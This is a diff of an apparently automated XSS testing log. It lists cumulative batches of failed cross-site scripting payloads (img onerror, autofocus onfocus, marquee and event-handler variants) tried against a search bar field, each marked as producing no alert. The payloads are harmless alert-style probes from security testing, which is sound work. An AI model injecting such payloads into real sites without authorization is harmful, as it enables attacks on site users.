@@ -1,39 +1,327 @@
-# Failed XSS Payloads - 2025-06-28 05:15:14.872445
+# Failed XSS Payloads - 2025-07-22 19:26:22.503961
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:15:46.631579
+# Failed XSS Payloads - 2025-07-22 19:27:07.453770
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:16:11.780094
+# Failed XSS Payloads - 2025-07-22 19:27:46.308910
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:16:45.969138
-# Payload | Expected Behavior | Actual Behavior | Context | Test Context
-><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:17:15.778280
+# Failed XSS Payloads - 2025-07-22 19:28:37.776524
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:17:46.458275
+# Failed XSS Payloads - 2025-07-22 19:29:24.720509
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:18:11.388689
+# Failed XSS Payloads - 2025-07-22 19:30:09.525769
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:18:49.538699
+# Failed XSS Payloads - 2025-07-22 19:30:47.570634
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
-# Failed XSS Payloads - 2025-06-28 05:20:37.958237
+# Failed XSS Payloads - 2025-07-22 19:31:39.582047
 # Payload | Expected Behavior | Actual Behavior | Context | Test Context
 ><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
 <input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:34:07.076373
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:35:03.384271
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:35:58.236378
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:36:54.844359
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:37:48.702033
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:38:27.644866
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:39:12.840361
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:40:03.289627
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:40:54.907041
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:41:40.689510
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:42:28.694163
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:43:14.824019
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:43:59.534168
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:44:46.349359
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:45:36.597253
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:46:25.402651
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:47:14.570349
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:48:03.287492
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
